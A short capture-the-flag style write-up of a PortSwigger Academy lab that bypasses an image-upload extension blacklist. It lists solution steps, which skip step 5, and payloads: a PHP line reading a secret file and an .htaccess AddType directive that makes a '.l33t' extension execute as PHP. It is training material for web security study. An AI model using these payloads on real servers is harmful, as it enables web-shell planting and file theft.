# Lab: Web shell upload via extension blacklist bypass

**Official lab:** [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

## Lab idea

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist. The challenge examines an incomplete or flawed extension blacklist. It practices recognizing why a denylist can fail when extension handling and server configuration do not align.

## Vulnerability in brief
There is no widely used acronym for this topic.

## Solution idea
1. Log in and upload an image as your avatar, then go back to your account page.
2. In Burp, go to Proxy > HTTP history and notice that your image was fetched using a GET request to /files/avatars/<YOUR-IMAGE> .
3. On your system, create a file called exploit.php containing a script for fetching the contents of Carlos's secret.
4. Attempt to upload this script as your avatar.
- …
6. Change the value of the filename parameter from exploit.php to exploit.l33t .
7. Switch to the other Repeater tab containing the GET /files/avatars/<YOUR-IMAGE> request.
8. Submit the secret to solve the lab.

## Payloads / key values
- `GET`
- `/files/avatars/<YOUR-IMAGE>`
- `exploit.php`
- `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- `.php`
- `POST /my-account/avatar`
- `filename`
- `.htaccess`
- `Content-Type`
- `text/plain`
- `AddType application/x-httpd-php .l33t`
- `.l33t`
- `application/x-httpd-php`
- `mod_php`
- `exploit.l33t`
- `GET /files/avatars/<YOUR-IMAGE>`

## Official source
- [PortSwigger Academy: Lab: Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)
